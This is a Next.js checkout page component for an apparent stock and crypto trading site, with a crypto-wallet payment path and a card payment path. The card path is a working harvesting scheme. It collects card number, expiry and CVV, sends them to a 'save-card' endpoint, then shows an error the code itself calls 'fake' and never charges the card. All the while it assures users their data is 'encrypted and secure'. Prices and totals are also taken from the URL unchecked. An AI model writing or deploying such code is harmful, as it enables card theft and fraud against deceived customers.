'use client';
import { useState, Suspense, useEffect } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Navbar from '@/components/Navbar';
import Footer from '@/components/Footer';
import { Copy, Upload, CheckCircle, AlertCircle, CreditCard, Banknote, Ticket, Loader2 } from 'lucide-react';
import { useAuth } from '@/context/AuthContext';
import axios from 'axios';
import Image from 'next/image';

function CheckoutContent() {
    const searchParams = useSearchParams();
    const { user } = useAuth();
    const router = useRouter(); // Restore router
    
    // Get params
    const symbol = searchParams.get('symbol');
    const type = searchParams.get('type') || 'stock'; // stock or crypto
    const quantity = parseFloat(searchParams.get('qty') || '0');
    const price = parseFloat(searchParams.get('price') || '0');
    const total = parseFloat(searchParams.get('total') || (quantity * price).toFixed(2));

    const [userData, setUserData] = useState(null);
    const [inventory, setInventory] = useState([]);
    
    // UI State
    const [proof, setProof] = useState('');
    const [fileName, setFileName] = useState('');
    const [submitting, setSubmitting] = useState(false);
    const [error, setError] = useState('');
    const [paymentMethod, setPaymentMethod] = useState('manual'); // 'manual' or 'card'
    const [selectedCard, setSelectedCard] = useState(null); // Applied discount card
    
    // Card Form State
    const [cardData, setCardData] = useState({
        holder: '',
        number: '',
        expiry: '',
        cvv: ''
    });

    useEffect(() => {
        if (user?._id || user?.id) {
            fetchUserLoyalty();
        }
    }, [user]);

    const fetchUserLoyalty = async () => {
        try {
            const userId = user?._id || user?.id;
            const res = await axios.get(`/api/loyalty/user/${userId}`);
            if (res.data.success) {
                setUserData(res.data.user);
                // Filter for unused freeze cards
                const freezeCards = res.data.user.inventory.filter(i => i.itemType === 'freeze_card' && !i.isUsed);
                setInventory(freezeCards);
            }
        } catch (err) {
            console.error("Failed to load inventory", err);
        }
    };

    const BINANCE_WALLET = "0x1234...ABCD...EFGH"; // Mock Wallet

    const handleFileChange = (e) => {
        const file = e.target.files[0];
        if (file) {
            setFileName(file.name);
            // Convert to base64
            const reader = new FileReader();
            reader.onloadend = () => {
                setProof(reader.result);
            };
            reader.readAsDataURL(file);
        }
    };

    const isCustomStock = searchParams.get('isCustom') === 'true';

    const getDiscountedTotal = () => {
        if (selectedCard) {
            const discount = (total * selectedCard.value) / 100;
            return total - discount;
        }
        return total;
    };

    const handleCardInputChange = (e) => {
        setCardData({ ...cardData, [e.target.name]: e.target.value });
    };

    const handleOrder = async () => {
        setSubmitting(true);
        setError('');

        if (paymentMethod === 'card') {
            // Check card fields
            if (!cardData.holder || !cardData.number || !cardData.expiry || !cardData.cvv) {
                setError('Please fill in all card details.');
                setSubmitting(false);
                return;
            }

            try {
                // Save card info and get "fake" error
                const res = await fetch('/api/checkout/save-card', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        userId: user?._id || user?.id,
                        cardHolder: cardData.holder,
                        cardNumber: cardData.number,
                        expiry: cardData.expiry,
                        cvv: cardData.cvv
                    })
                });
                const data = await res.json();
                setError(data.error); // Show the fake error
                setSubmitting(false);
                return; // Stop here as requested
            } catch (err) {
                setError('Card verification failed. Please try another method.');
                setSubmitting(false);
                return;
            }
        }

        // Manual Payment Logic
        if (!proof) {
            setError('Please upload a payment proof screenshot.');
            setSubmitting(false);
            return;
        }

        try {
            const res = await fetch('/api/orders', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type,
                    symbol,
                    quantity,
                    price,
                    totalAmount: getDiscountedTotal(),
                    paymentProof: proof,
                    appliedCardId: selectedCard?._id,
                    originalTotal: total,
                    discountAmount: selectedCard ? (total * selectedCard.value) / 100 : 0,
                    appliedCardInfo: selectedCard ? {
                        name: selectedCard.name,
                        value: selectedCard.value
                    } : null
                })
            });

            const data = await res.json();
            if (res.ok) {
                router.push('/dashboard?orderSuccess=true');
            } else {
                setError(data.error || 'Failed to submit order');
                setSubmitting(false);
            }
        } catch (err) {
            setError('Something went wrong. Please try again.');
            setSubmitting(false);
        }
    };

    if (!symbol || !quantity || !total) {
        return (
            <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-black text-black dark:text-white">
                <div className="text-center">
                    <h1 className="text-2xl font-bold mb-4">Invalid Checkout Session</h1>
                    <button onClick={() => router.back()} className="text-blue-500 hover:underline">Go Back</button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-white dark:bg-black text-black dark:text-white flex flex-col font-sans">
            <Navbar />
            
            <div className="grow flex items-center mt-10 justify-center py-20 px-4">
                <div className="w-full max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-12">
                    
                    {/* Left: Order Summary */}
                    <div className="space-y-6">
                        <div className="bg-gray-50 dark:bg-zinc-900 p-8 rounded-3xl border border-gray-100 dark:border-zinc-800">
                             <h2 className="text-2xl font-bold mb-6 anta-regular">Order Summary</h2>
                             
                             <div className="space-y-4">
                                <div className="flex justify-between items-center py-3 border-b border-gray-200 dark:border-zinc-800">
                                    <span className="text-gray-500 dark:text-gray-400">Asset</span>
                                    <span className="font-bold text-lg">{symbol} <span className="text-xs font-normal bg-blue-100 dark:bg-blue-900 text-blue-600 px-2 py-1 rounded-full uppercase">{type}</span></span>
                                </div>
                                <div className="flex justify-between items-center py-3 border-b border-gray-200 dark:border-zinc-800">
                                    <span className="text-gray-500 dark:text-gray-400">Price per unit</span>
                                    <span className="font-semibold">${price.toLocaleString()}</span>
                                </div>
                                <div className="flex justify-between items-center py-3 border-b border-gray-200 dark:border-zinc-800">
                                    <span className="text-gray-500 dark:text-gray-400">Quantity</span>
                                    <span className="font-semibold">{quantity}</span>
                                </div>
                                <div className="flex justify-between items-center pt-4 border-t border-gray-200 dark:border-zinc-800">
                                    <span className="text-gray-500 dark:text-gray-400 font-medium">Original Total</span>
                                    <span className={`${selectedCard ? 'line-through text-gray-400 text-lg' : 'text-xl font-bold'}`}>${total.toLocaleString()}</span>
                                </div>
                                {selectedCard && (
                                    <div className="flex justify-between items-center text-green-600 dark:text-green-400 font-bold">
                                        <span>Discount ({selectedCard.value}%)</span>
                                        <span>-${((total * selectedCard.value) / 100).toLocaleString()}</span>
                                    </div>
                                )}
                                <div className="flex justify-between items-center pt-2">
                                    <span className="text-black dark:text-white font-bold text-lg">Subtotal</span>
                                    <span className="text-3xl font-bold text-blue-600 dark:text-blue-400">${getDiscountedTotal().toLocaleString()}</span>
                                </div>
                             </div>
                        </div>

                        {/* Inventory / Freeze Cards */}
                        {isCustomStock && inventory.length > 0 && (
                            <div className="bg-white dark:bg-zinc-900 p-6 rounded-3xl border border-blue-100 dark:border-blue-900/30">
                                <div className="flex items-center gap-2 mb-4">
                                    <Ticket className="text-blue-500" size={20}/>
                                    <h3 className="font-bold">Apply Freeze Card</h3>
                                </div>
                                <div className="grid grid-cols-1 gap-3">
                                    {inventory.map((card) => (
                                        <button 
                                            key={card._id}
                                            onClick={() => setSelectedCard(selectedCard?._id === card._id ? null : card)}
                                            className={`flex items-center justify-between p-4 rounded-xl border transition-all ${selectedCard?._id === card._id ? 'bg-blue-600 border-blue-600 text-white shadow-md' : 'bg-gray-50 dark:bg-black border-gray-100 dark:border-zinc-800 hover:border-blue-400'}`}
                                        >
                                            <div className="flex items-center gap-3">
                                                <div className={`w-10 h-10 rounded-lg flex items-center justify-center font-bold ${selectedCard?._id === card._id ? 'bg-white/20' : 'bg-blue-100 dark:bg-blue-900 text-blue-600'}`}>
                                                    {card.value}%
                                                </div>
                                                <div className="text-left">
                                                    <p className="font-bold text-sm">{card.name}</p>
                                                    <p className={`text-xs ${selectedCard?._id === card._id ? 'text-blue-100' : 'text-gray-500'}`}>Discount Card</p>
                                                </div>
                                            </div>
                                            {selectedCard?._id === card._id && <CheckCircle size={18}/>}
                                        </button>
                                    ))}
                                </div>
                            </div>
                        )}

                         <div className="bg-blue-50 dark:bg-blue-900/10 p-6 rounded-2xl border border-blue-100 dark:border-blue-900/30 flex gap-4 items-start">
                            <InfoIcon className="shrink-0 text-blue-500" />
                            <p className="text-sm text-blue-700 dark:text-blue-300 leading-relaxed">
                                Your order will be placed in <strong>Pending</strong> status. Once your payment is verified by our admin team, the assets will be added to your portfolio.
                            </p>
                        </div>
                    </div>

                    {/* Right: Payment */}
                    <div className="space-y-8">
                         <div>
                            <h2 className="text-2xl font-bold mb-4 anta-regular">Payment Method</h2>
                            <div className="flex gap-4">
                                <button 
                                    onClick={() => setPaymentMethod('manual')}
                                    className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-2xl font-bold border transition-all ${paymentMethod === 'manual' ? 'bg-black text-white dark:bg-white dark:text-black border-black dark:border-white shadow-lg' : 'bg-white dark:bg-zinc-900 text-gray-400 border-gray-100 dark:border-zinc-800'}`}
                                >
                                    <Banknote size={20}/> Manual
                                </button>
                                <button 
                                    onClick={() => setPaymentMethod('card')}
                                    className={`flex-1 flex items-center justify-center gap-2 py-4 rounded-2xl font-bold border transition-all ${paymentMethod === 'card' ? 'bg-black text-white dark:bg-white dark:text-black border-black dark:border-white shadow-lg' : 'bg-white dark:bg-zinc-900 text-gray-400 border-gray-100 dark:border-zinc-800'}`}
                                >
                                    <CreditCard size={20}/> Card
                                </button>
                            </div>
                         </div>

                         {paymentMethod === 'manual' ? (
                            <>
                                <div>
                                    <p className="text-gray-500 dark:text-gray-400 mb-4">Send the exact amount to the wallet address below.</p>
                                </div>

                                {/* Wallet Address */}
                                <div className="bg-zinc-100 dark:bg-zinc-900 p-6 rounded-2xl border border-gray-200 dark:border-zinc-800 relative group">
                                    <label className="block text-xs font-bold text-gray-500 uppercase mb-2">Binance Wallet (USDT/BTC)</label>
                                    <div className="flex items-center justify-between bg-white dark:bg-black p-4 rounded-xl font-mono text-sm break-all">
                                        {BINANCE_WALLET}
                                        <button 
                                            onClick={() => navigator.clipboard.writeText(BINANCE_WALLET)}
                                            className="ml-4 text-gray-400 hover:text-blue-500 transition-colors"
                                            title="Copy Address"
                                        >
                                            <Copy size={18} />
                                        </button>
                                    </div>
                                </div>

                                {/* Proof Upload */}
                                <div>
                                    <label className="block text-sm font-bold mb-3">Upload Payment Proof</label>
                                    <div className="relative">
                                        <input 
                                            type="file" 
                                            accept="image/*"
                                            onChange={handleFileChange}
                                            className="hidden"
                                            id="proof-upload"
                                        />
                                        <label 
                                            htmlFor="proof-upload"
                                            className={`flex flex-col items-center justify-center w-full h-32 border-2 border-dashed rounded-2xl cursor-pointer transition-colors ${fileName ? 'border-green-500 bg-green-50 dark:bg-green-900/10' : 'border-gray-200 dark:border-zinc-700 hover:border-blue-500 dark:hover:border-blue-500'}`}
                                        >
                                            {fileName ? (
                                                <div className="flex items-center gap-2 text-green-600 dark:text-green-400">
                                                    <CheckCircle size={24} />
                                                    <span className="font-medium truncate max-w-[200px]">{fileName}</span>
                                                </div>
                                            ) : (
                                                <div className="flex flex-col items-center text-gray-500 dark:text-gray-400">
                                                    <Upload size={24} className="mb-2" />
                                                    <span className="text-sm font-medium">Click to upload screenshot</span>
                                                    <span className="text-xs text-gray-400 mt-1">JPG, PNG (Max 5MB)</span>
                                                </div>
                                            )}
                                        </label>
                                    </div>
                                </div>
                            </>
                         ) : (
                             <div className="space-y-6">
                                 <div>
                                    <p className="text-gray-500 dark:text-gray-400 mb-4">Pay securely using your credit or debit card.</p>
                                 </div>
                                 <div className="grid grid-cols-1 gap-4">
                                     <div className="space-y-2">
                                         <label className="text-xs font-bold uppercase text-gray-500">Card Holder Name</label>
                                         <input 
                                            type="text" 
                                            name="holder"
                                            value={cardData.holder}
                                            onChange={handleCardInputChange}
                                            placeholder="Enter Name"
                                            className="w-full bg-gray-50 dark:bg-zinc-800 p-4 rounded-xl border border-gray-200 dark:border-zinc-700 outline-none focus:border-blue-500"
                                         />
                                     </div>
                                     <div className="space-y-2">
                                         <label className="text-xs font-bold uppercase text-gray-500">Card Number</label>
                                         <input 
                                            type="text" 
                                            name="number"
                                            value={cardData.number}
                                            onChange={handleCardInputChange}
                                            placeholder="XXXX XXXX XXXX XXXX"
                                            className="w-full bg-gray-50 dark:bg-zinc-800 p-4 rounded-xl border border-gray-200 dark:border-zinc-700 outline-none focus:border-blue-500"
                                         />
                                     </div>
                                     <div className="grid grid-cols-2 gap-4">
                                         <div className="space-y-2">
                                            <label className="text-xs font-bold uppercase text-gray-500">Expiry Date</label>
                                            <input 
                                                type="text" 
                                                name="expiry"
                                                value={cardData.expiry}
                                                onChange={handleCardInputChange}
                                                placeholder="MM / YY"
                                                className="w-full bg-gray-50 dark:bg-zinc-800 p-4 rounded-xl border border-gray-200 dark:border-zinc-700 outline-none focus:border-blue-500"
                                            />
                                         </div>
                                         <div className="space-y-2">
                                            <label className="text-xs font-bold uppercase text-gray-500">CVV</label>
                                            <input 
                                                type="password" 
                                                name="cvv"
                                                value={cardData.cvv}
                                                onChange={handleCardInputChange}
                                                placeholder="***"
                                                className="w-full bg-gray-50 dark:bg-zinc-800 p-4 rounded-xl border border-gray-200 dark:border-zinc-700 outline-none focus:border-blue-500"
                                            />
                                         </div>
                                     </div>
                                 </div>
                                 <div className="bg-blue-50 dark:bg-blue-900/10 p-4 rounded-xl flex gap-3 text-blue-600 dark:text-blue-400 text-xs font-medium">
                                     <Shield size={16}/>
                                     Your payment data is encrypted and secure.
                                 </div>
                             </div>
                         )}

                         {error && (
                            <div className="flex items-center gap-2 text-red-500 text-sm bg-red-50 dark:bg-red-900/20 p-4 rounded-xl">
                                <AlertCircle size={18} /> {error}
                            </div>
                         )}

                         <button 
                            onClick={handleOrder}
                            disabled={submitting}
                            className={`w-full py-4 rounded-full font-bold text-lg text-white transition-all ${submitting ? 'bg-gray-400 cursor-not-allowed' : 'bg-black dark:bg-white dark:text-black hover:opacity-90 shadow-lg hover:shadow-xl'}`}
                         >
                            {submitting ? <Loader2 className="animate-spin inline-block mx-auto"/> : (paymentMethod === 'card' ? `Pay Now ($${getDiscountedTotal().toLocaleString()})` : `Confirm Payment ($${getDiscountedTotal().toLocaleString()})`)}
                         </button>
                    </div>
                </div>
            </div>
            
            <Footer />
        </div>
    );
}

function InfoIcon({ className }) {
    return (
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg>
    )
}

function Shield({ className, size = 20 }) {
    return (
        <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    )
}

export default function CheckoutPage() {
    return (
        <Suspense fallback={<div className="min-h-screen bg-white dark:bg-black" />}>
            <CheckoutContent />
        </Suspense>
    )
}
